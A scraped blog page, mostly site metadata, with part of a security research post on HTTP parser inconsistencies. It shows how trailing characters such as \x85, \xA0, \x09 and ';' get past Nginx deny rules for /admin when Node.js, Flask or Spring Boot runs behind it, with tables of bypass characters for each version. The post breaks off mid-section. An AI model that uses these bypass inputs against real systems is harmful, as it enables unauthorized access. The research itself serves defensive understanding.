Breaches\",\"isPartOfSeries\":false,\"hasTags\":true,\"pendingPublicationApproval\":false,\"ogImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022613860/91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif\",\"metaTitle\":\"(Research) Exploiting HTTP Parsers Inconsistencies\",\"metaDescription\":\"In this cybersecurity research, I'm going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF].\",\"isRepublished\":false,\"autoPublishedFromRSS\":false,\"responses\":[],\"isFeatured\":true,\"hasLatex\":false,\"stickCoverToBottom\":true,\"hideBadges\":false,\"badges\":[{\"name\":\"postFeaturedHN\"}],\"isDelisted\":false,\"audioUrls\":{},\"disableComments\":false,\"enableToc\":true,\"toc\":[[{\"id\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\",\"level\":1,\"slug\":\"pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\",\"title\":\"Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\",\"parentId\":null}],[{\"id\":\"fa166e5c-0b0e-4957-8eb7-88f7c58f4415\",\"level\":2,\"slug\":\"nginx-acl-rules\",\"title\":\"Nginx ACL Rules\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"f5554760-21fd-4080-9078-0e9a31adb2c5\",\"level\":2,\"slug\":\"trim-inconsistencies\",\"title\":\"Trim Inconsistencies\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"04aa7506-34d7-4291-9c36-6f0429fef520\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-nodejs\",\"title\":\"Bypassing Nginx ACL Rules With Node.js\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"1d9a1daa-f753-4b31-9452-fb3bccc334c5\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-flask\",\"title\":\"Bypassing Nginx ACL Rules With Flask\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"bf06e637-fa3c-4b02-bbd0-535e8862ed60\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-spring-boot\",\"title\":\"Bypassing Nginx ACL Rules With Spring Boot\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"8d8306a9-c4fa-4c45-92fa-aebb2e886f80\",\"level\":2,\"slug\":\"bypassing-nginx-acl-rules-with-php-fpm-integration\",\"title\":\"Bypassing Nginx ACL Rules With PHP-FPM Integration\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"80d340c5-2edf-4d76-a751-cb85c81df78c\",\"level\":2,\"slug\":\"how-to-prevent\",\"title\":\"How to prevent\",\"parentId\":\"d050ee56-187a-4a8e-9fa6-a99d575bb874\"}],[{\"id\":\"6493de19-d626-479e-8986-84670b6f85ae\",\"level\":1,\"slug\":\"bypassing-aws-waf-acl\",\"title\":\"Bypassing AWS WAF ACL\",\"parentId\":null}],[{\"id\":\"df30fef9-02f8-47db-9cbe-1e49a3f36343\",\"level\":2,\"slug\":\"how-aws-waf-acls-work\",\"title\":\"How AWS WAF ACLs Work\",\"parentId\":\"6493de19-d626-479e-8986-84670b6f85ae\"}],[{\"id\":\"70a52fc0-b644-4cc4-a712-6eb7ad60fc7f\",\"level\":2,\"slug\":\"bypassing-aws-waf-acl-with-line-folding\",\"title\":\"Bypassing AWS WAF ACL With Line Folding\",\"parentId\":\"6493de19-d626-479e-8986-84670b6f85ae\"}],[{\"id\":\"268678d3-485e-49a1-89c3-048811a313e2\",\"level\":1,\"slug\":\"incorrect-path-parsing-leads-to-server-side-request-forgery\",\"title\":\"Incorrect Path Parsing Leads to Server-Side Request Forgery\",\"parentId\":null}],[{\"id\":\"1bcc7d29-1379-4cc8-8883-14c1c107dea2\",\"level\":2,\"slug\":\"ssrf-on-flask-through-incorrect-pathname-interpretation\",\"title\":\"SSRF on Flask Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"7b140771-f25b-4aab-94ee-5bd0cff5a2ae\",\"level\":2,\"slug\":\"ssrf-on-spring-boot-through-incorrect-pathname-interpretation\",\"title\":\"SSRF on Spring Boot Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"c40f232f-b920-4fda-9696-dcf62c980f49\",\"level\":2,\"slug\":\"php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\",\"title\":\"PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"79b3a29d-790b-405f-89b2-bfadc5a39975\",\"level\":2,\"slug\":\"how-to-prevent-1\",\"title\":\"How to prevent\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"}],[{\"id\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\",\"level\":1,\"slug\":\"http-desync-cache-poisoning-attacks\",\"title\":\"HTTP Desync Cache Poisoning Attacks\",\"parentId\":null}],[{\"id\":\"73d5400e-1c74-4ecf-92d6-6cbecd247573\",\"level\":2,\"slug\":\"cache-keys\",\"title\":\"Cache Keys\",\"parentId\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\"}],[{\"id\":\"81f4c133-20bb-4d3e-afcf-117cf80024c6\",\"level\":2,\"slug\":\"s3-http-desync-cache-poisoning-issue\",\"title\":\"S3 HTTP Desync Cache Poisoning Issue\",\"parentId\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\"}],[{\"id\":\"7ec99b8e-175c-4a52-aa2f-84d419d9ec8e\",\"level\":3,\"slug\":\"the-vulnerability\",\"title\":\"The Vulnerability\",\"parentId\":\"81f4c133-20bb-4d3e-afcf-117cf80024c6\"}],[{\"id\":\"b8bf3109-7624-4bf1-a074-a1c3d0bd7727\",\"level\":1,\"slug\":\"conclusion\",\"title\":\"Conclusion\",\"parentId\":null}]],\"noIndex\":false}","publication":"{\"__typename\":\"Publication\",\"id\":\"6488d69906c1659c6d332ff6\",\"url\":\"https://rafa.hashnode.dev\",\"canonicalURL\":\"https://rafa.hashnode.dev\",\"urlPattern\":\"SIMPLE\",\"title\":\"Rafa's Blog\",\"displayTitle\":\"\",\"hasBadges\":true,\"descriptionSEO\":\"This is my security research blog!\\n\",\"about\":{\"html\":\"\u003cp\u003eThis is my security research blog!\u003c/p\u003e\\n\",\"text\":\"This is my security research blog!\\n\"},\"features\":{\"newsletter\":{\"isEnabled\":true},\"viewCount\":{\"isEnabled\":false},\"readTime\":{\"isEnabled\":false},\"textSelectionSharer\":{\"isEnabled\":true},\"customCSS\":{\"isEnabled\":false,\"published\":null,\"draft\":null}},\"metaTags\":null,\"ogMetaData\":{\"image\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022404075/tXTvi1WB-.gif\"},\"author\":{\"__typename\":\"User\",\"id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"username\":\"rafax00\",\"profilePicture\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\"},\"preferences\":{\"__typename\":\"Preferences\",\"logo\":null,\"darkMode\":{\"__typename\":\"DarkModePreferences\",\"logo\":null,\"enabled\":false},\"navbarItems\":[{\"__typename\":\"PublicationNavbarItem\",\"id\":\"648deaa267a3e6fc49d12f9e\",\"label\":\"sponsor me\",\"url\":\"https://rafa.hashnode.dev/sponsor\",\"priority\":0,\"type\":\"link\",\"series\":null,\"page\":null}],\"enabledPages\":{\"__typename\":\"PagesPreferences\",\"badges\":true,\"newsletter\":true,\"members\":null},\"layout\":\"grid\",\"disableFooterBranding\":false,\"isSubscriptionModalDisabled\":false},\"favicon\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif\",\"headerColor\":\"#0f172a\",\"integrations\":{\"fbPixelID\":null,\"fathomSiteID\":null,\"fathomCustomDomainEnabled\":null,\"fathomCustomDomain\":null,\"hotjarSiteID\":null,\"matomoSiteID\":null,\"matomoURL\":null,\"gaTrackingID\":null,\"plausibleAnalyticsEnabled\":null,\"wmPaymentPointer\":null,\"umamiWebsiteUUID\":\"0a9b6a2b-0d1f-4a14-a038-28d183bdfe8b\"},\"imprintV2\":null,\"postsCount\":{\"totalDocuments\":3},\"isTeam\":false,\"links\":{\"twitter\":\"https://twitter.com/rafabyte_\",\"instagram\":\"\",\"github\":\"https://github.com/rafax00\",\"website\":\"\",\"hashnode\":\"https://hashnode.com/@rafax00\",\"youtube\":\"\",\"dailydev\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\",\"mastodon\":\"\"},\"domainInfo\":{\"__typename\":\"DomainInfo\",\"hashnodeSubdomain\":\"rafa\",\"domain\":null,\"wwwPrefixedDomain\":null},\"redirectionRules\":[],\"totalRecommendedPublications\":0,\"sponsorship\":{\"content\":{\"html\":\"\u003cp\u003eIf you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\u003c/p\u003e\\n\",\"markdown\":\"If you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\"},\"stripe\":{\"connected\":true,\"accountId\":\"acct_1NK2WzIqhGEy5ZXI\",\"country\":\"BR\"}},\"pro\":null,\"allowContributorEdits\":true,\"rssImport\":null,\"post\":{\"id\":\"648dec85578b47894c6af863\",\"cuid\":\"clj09rtsw000109le1k4xblen\",\"title\":\"Exploiting HTTP Parsers Inconsistencies\",\"subtitle\":\"Unveiling Vulnerabilities in HTTP Parsers: Exploiting Inconsistencies for Security Breaches\",\"slug\":\"exploiting-http-parsers-inconsistencies\",\"brief\":\"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\\nIn this resea...\",\"featured\":true,\"publishedAt\":\"2023-06-17T17:25:25.280Z\",\"updatedAt\":\"2023-10-23T11:36:22.929Z\",\"author\":{\"__typename\":\"User\",\"id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"username\":\"rafax00\",\"deactivated\":false,\"profilePicture\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\",\"isPro\":false,\"bio\":{\"html\":\"\u003cp\u003eI'm Rafael, a Cybersecurity Analyst at SiDi with a strong focus on web applications. With a solid background in cybersecurity and a passion for uncovering vulnerabilities, I also have had the privilege of working with several Big Tech companies through Bug Bounty programs.\u003c/p\u003e\\n\"},\"socialMediaLinks\":{\"website\":\"\",\"github\":\"https://github.com/rafax00\",\"twitter\":\"\",\"facebook\":\"\",\"stackoverflow\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\"}},\"coAuthors\":[],\"seo\":{\"title\":\"(Research) Exploiting HTTP Parsers Inconsistencies\",\"description\":\"In this cybersecurity research, I'm going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF].\",\"shouldNotIndex\":false},\"coverImage\":{\"url\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686855768304/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png\",\"isPortrait\":false,\"attribution\":null,\"isAttributionHidden\":false,\"photographer\":null},\"responseCount\":4,\"reactionCount\":43,\"replyCount\":2,\"content\":{\"html\":\"\u003cp\u003eThe HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\u003c/p\u003e\\n\u003cp\u003eIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\u003c/p\u003e\\n\u003cp\u003eIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\\\"\u003ePathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\u003c/h1\u003e\\n\u003cp\u003eThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of \u003ccode\u003etrim()\u003c/code\u003e or \u003ccode\u003estrip()\u003c/code\u003e functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\u003c/p\u003e\\n\u003cp\u003eIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-nginx-acl-rules\\\"\u003eNginx ACL Rules\u003c/h2\u003e\\n\u003cp\u003eNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\u003c/p\u003e\\n\u003cp\u003eIn Nginx, the \\\"location\\\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe above Nginx rule aims to deny every access to the \u003ccode\u003e/admin\u003c/code\u003e endpoint, so if a user tries to access this endpoint, Nginx will return \u003ccode\u003e403\u003c/code\u003e and will not pass the HTTP message to the web server.\u003c/p\u003e\\n\u003cp\u003eTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-trim-inconsistencies\\\"\u003eTrim Inconsistencies\u003c/h2\u003e\\n\u003cp\u003eBefore we proceed, we need to understand what the \u003ccode\u003etrim()\u003c/code\u003e function does in different languages.\u003c/p\u003e\\n\u003cp\u003eDifferent languages remove different characters when the correspondent function for \u003ccode\u003etrim()\u003c/code\u003e is called. Each server will normalize the pathname based on its \u003ccode\u003etrim()\u003c/code\u003e, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\u003c/p\u003e\\n\u003cp\u003eE.g.: Python removes the character \u003ccode\u003e\\\\x85\u003c/code\u003e with \u003ccode\u003estrip()\u003c/code\u003e, and JavaScript does not with \u003ccode\u003etrim()\u003c/code\u003e.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIf an HTTP message is parsed using the \u003ccode\u003etrim()\u003c/code\u003e function in different languages, an HTTP Desync attack can occur.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-nodejs\\\"\u003eBypassing Nginx ACL Rules With Node.js\u003c/h2\u003e\\n\u003cp\u003eLet's consider the following Nginx ACL rule and Node.js API source code using Express:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-javascript\\\"\u003eapp.get(\u003cspan class=\\\"hljs-string\\\"\u003e'/admin'\u003c/span\u003e, \u003cspan class=\\\"hljs-function\\\"\u003e(\u003cspan class=\\\"hljs-params\\\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e res.send(\u003cspan class=\\\"hljs-string\\\"\u003e'ADMIN'\u003c/span\u003e);\\n});\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eFollowing the \u003ccode\u003etrim()\u003c/code\u003e logic, Node.js \\\"ignores\\\" the characters \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\xa0\u003c/code\u003e, and \u003ccode\u003e\\\\x0c\u003c/code\u003e from the pathname, but Nginx considers them as part of the URL:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eFirst, Nginx receives the HTTP request and performs path normalization on the pathname;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eAs Nginx includes the character \u003ccode\u003e\\\\xa0\u003c/code\u003e as part of the pathname, the ACL rule for the \u003ccode\u003e/admin\u003c/code\u003e URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eWhen the URI \u003ccode\u003e/admin\\\\x0a\u003c/code\u003e is received by the Node.js server, the character \u003ccode\u003e\\\\xa0\u003c/code\u003e will be removed, allowing successful retrieval of the \u003ccode\u003e/admin\u003c/code\u003e endpoint.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003cp\u003eBelow is a graphical demonstration of what happens with the HTTP request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\u003c/p\u003e\\n\u003cdiv class=\\\"embed-wrapper\\\"\u003e\u003cdiv class=\\\"embed-loading\\\"\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\\\"embed-card\\\" href=\\\"https://www.youtube.com/watch?v=sgs3s5oTfz8\\\"\u003ehttps://www.youtube.com/watch?v=sgs3s5oTfz8\u003c/a\u003e\u003c/div\u003e\\n\u003cp\u003e \u003c/p\u003e\\n\u003cp\u003eBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eNode.js Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-flask\\\"\u003eBypassing Nginx ACL Rules With Flask\u003c/h2\u003e\\n\u003cp\u003eFlask removes the characters \u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e, and \u003ccode\u003e\\\\x09\u003c/code\u003e from the URL path, but NGINX doesn't.\u003c/p\u003e\\n\u003cp\u003eTake the following nginx configuration/API source code as a reference:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/admin', methods = ['GET'])\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eadmin\u003c/span\u003e():\u003c/span\u003e\\n    data = {\u003cspan class=\\\"hljs-string\\\"\u003e\\\"url\\\"\u003c/span\u003e:request.url, \u003cspan class=\\\"hljs-string\\\"\u003e\\\"admin\\\"\u003c/span\u003e:\u003cspan class=\\\"hljs-string\\\"\u003e\\\"True\\\"\u003c/span\u003e}\\n\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e Response(str(data), mimetype=\u003cspan class=\\\"hljs-string\\\"\u003e\\\"application/json\\\"\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eAs you can see below, it's possible to circumvent the ACL protection by adding the character \u003ccode\u003e\\\\x85\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eFlask Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-spring-boot\\\"\u003eBypassing Nginx ACL Rules With Spring Boot\u003c/h2\u003e\\n\u003cp\u003eSpring removes the characters \u003ccode\u003e\\\\x09\u003c/code\u003e and \u003ccode\u003e\\\\x3B\u003c/code\u003e from the URL path, but Nginx doesn't.\u003c/p\u003e\\n\u003cp\u003eTake the following Nginx configuration/API source code as a reference:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-java\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e@GetMapping(\\\"/admin\\\")\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003epublic\u003c/span\u003e String \u003cspan class=\\\"hljs-title\\\"\u003eadmin\u003c/span\u003e\u003cspan class=\\\"hljs-params\\\"\u003e()\u003c/span\u003e \u003c/span\u003e{\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e\\\"Greetings from Spring Boot!\\\"\u003c/span\u003e;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character \u003ccode\u003e\\\\x09\u003c/code\u003e or \u003ccode\u003e\\\\t\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eSpring Boot Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 